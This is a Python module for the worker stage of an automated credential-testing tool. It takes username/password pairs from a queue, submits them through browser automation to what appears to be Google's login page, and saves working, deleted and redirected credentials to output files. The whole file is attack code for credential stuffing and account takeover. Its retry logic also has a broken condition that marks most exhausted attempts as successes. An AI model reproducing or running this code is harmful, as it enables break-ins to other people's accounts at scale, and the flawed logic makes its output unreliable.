"""
Login worker — core credential testing coroutine.

Each worker consumes credentials from the queue, creates a fresh browser
context, performs the login flow, detects the outcome, and records the result.
Includes retry logic with exponential backoff and exception recovery.
"""

from __future__ import annotations

import asyncio
import traceback

from loguru import logger

from automation.browser_pool import BrowserPool
from automation.detector import CompositeDetector, LoginResult
from automation.navigation import NavigationHelper
from services.queue_manager import POISON_PILL, QueueManager
from services.statistics import StatisticsTracker
from storage.output_manager import OutputManager


class LoginWorker:
    """Factory for creating login worker coroutines."""

    def __init__(
        self,
        browser_pool: BrowserPool,
        queue_manager: QueueManager,
        detector: CompositeDetector,
        navigator: NavigationHelper,
        output_manager: OutputManager,
        stats: StatisticsTracker,
        retry_count: int = 2,
        timeout: int = 30,
    ) -> None:
        self._pool = browser_pool
        self._queue = queue_manager
        self._detector = detector
        self._navigator = navigator
        self._output = output_manager
        self._stats = stats
        self._retry_count = retry_count
        self._timeout = timeout

    async def run(self, worker_id: int) -> None:
        """
        Worker coroutine that processes credentials from the queue.

        Runs until it receives a poison pill (shutdown signal).
        """
        logger.info(f"Worker {worker_id} started")
        processed = 0

        try:
            while True:
                # Get next credential from queue
                credential = await self._queue.get()

                # Poison pill = shutdown
                if credential is POISON_PILL or credential is None:
                    logger.info(f"Worker {worker_id} received shutdown signal")
                    break

                # Process with retries
                result = await self._process_credential(
                    worker_id,
                    credential.username,
                    credential.password,
                    credential.line_number,
                )

                processed += 1

                if processed % 50 == 0:
                    logger.info(
                        f"Worker {worker_id}: processed {processed} credentials"
                    )

        except asyncio.CancelledError:
            logger.info(f"Worker {worker_id} cancelled")
        except Exception as e:
            logger.error(f"Worker {worker_id} fatal error: {e}\n{traceback.format_exc()}")
        finally:
            logger.info(f"Worker {worker_id} stopped (processed {processed})")

    async def _process_credential(
        self,
        worker_id: int,
        username: str,
        password: str,
        line_number: int,
    ) -> LoginResult:
        """Process a single credential with retry logic."""
        last_error = None
        last_url: str = ""

        for attempt in range(self._retry_count + 1):
            try:
                result, final_url = await self._attempt_login(
                    worker_id, username, password
                )
                last_url = final_url

                # "deletedaccount" in URL always wins — store in deletedaccount.txt
                if "deletedaccount" in final_url.lower():
                    await self._output.result_writer.write(
                        "deleted",
                        username,
                        password,
                    )
                    self._stats.record_result("deleted")
                    return LoginResult.DELETED

                # If url does not contain google, write to otherwebsite instead
                if "google" not in final_url.lower():
                    await self._output.result_writer.write(
                        "otherwebsite",
                        username,
                        password,
                    )
                    self._stats.record_result("otherwebsite")
                    return result

                # Record result normally
                await self._output.record_result(
                    category=result.category,
                    username=username,
                    password=password,
                    line_number=line_number,
                    extra_info=f"worker={worker_id} attempt={attempt + 1}",
                )

                # Update statistics
                self._stats.record_result(result.category)

                return result

            except asyncio.TimeoutError:
                last_error = "timeout"
                logger.warning(
                    f"Worker {worker_id}: timeout for {username} "
                    f"(attempt {attempt + 1}/{self._retry_count + 1})"
                )
            except Exception as e:
                last_error = str(e)
                logger.warning(
                    f"Worker {worker_id}: error for {username} "
                    f"(attempt {attempt + 1}/{self._retry_count + 1}): {e}"
                )

            # Exponential backoff before retry
            if attempt < self._retry_count:
                delay = min(2 ** attempt, 10)
                await asyncio.sleep(delay)

        if last_url and "access-denied" or "admin" in last_url.lower() or "mail" in last_url.lower() or "inbox" in last_url.lower()  :
            logger.debug(
                f"Worker {worker_id}: retries exhausted, access-denied URL '{last_url}' "
                f"— writing to success"
            )
            await self._output.result_writer.write(
                "success",
                username,
                password,
            )
            self._stats.record_result("success")
            return LoginResult.SUCCESS

        # All retries exhausted — check last known URL before deciding category
        if last_url and "deletedaccount" in last_url.lower():
            logger.debug(
                f"Worker {worker_id}: retries exhausted, deletedaccount URL '{last_url}' "
                f"— writing to deleted"
            )
            await self._output.result_writer.write(
                "deleted",
                username,
                password,
            )
            self._stats.record_result("deleted")
            return LoginResult.DELETED

        if last_url and "google" not in last_url.lower():
            logger.debug(
                f"Worker {worker_id}: retries exhausted, non-Google URL '{last_url}' "
                f"— writing to otherwebsite"
            )
            await self._output.result_writer.write(
                "otherwebsite",
                username,
                password,
            )
            self._stats.record_result("otherwebsite")
            return LoginResult.OTHERWEBSITE

        category = "timeout" if last_error == "timeout" else "error"
        await self._output.record_result(
            category=category,
            username=username,
            password=password,
            line_number=line_number,
            extra_info=f"worker={worker_id} error={last_error}",
        )
        self._stats.record_result(category)
        return LoginResult.ERROR

    async def _attempt_login(
        self,
        worker_id: int,
        username: str,
        password: str,
    ) -> tuple[LoginResult, str]:
        """Perform a single login attempt with a fresh browser context."""
        context = await self._pool.acquire_context()

        try:
            page = await context.new_page()

            # Set overall timeout for the attempt
            page.set_default_timeout(self._timeout * 1000)

            # Navigate to login page
            if not await self._navigator.navigate_to_login(page):
                return LoginResult.ERROR, page.url

            # Fill credentials
            if not await self._navigator.fill_credentials(
                page, username, password
            ):
                return LoginResult.FAILURE, page.url

            # Submit form
            if not await self._navigator.submit_form(page):
                return LoginResult.ERROR, page.url

            # Wait for page to settle
            await self._navigator.wait_for_result(page)

            # Detect outcome
            result = await self._detector.detect(page)

            if result is None:
                logger.debug(
                    f"Worker {worker_id}: inconclusive for {username}, "
                    f"URL: {page.url}"
                )
                return LoginResult.UNKNOWN, page.url

            return result, page.url

        finally:
            await self._pool.release_context(context)
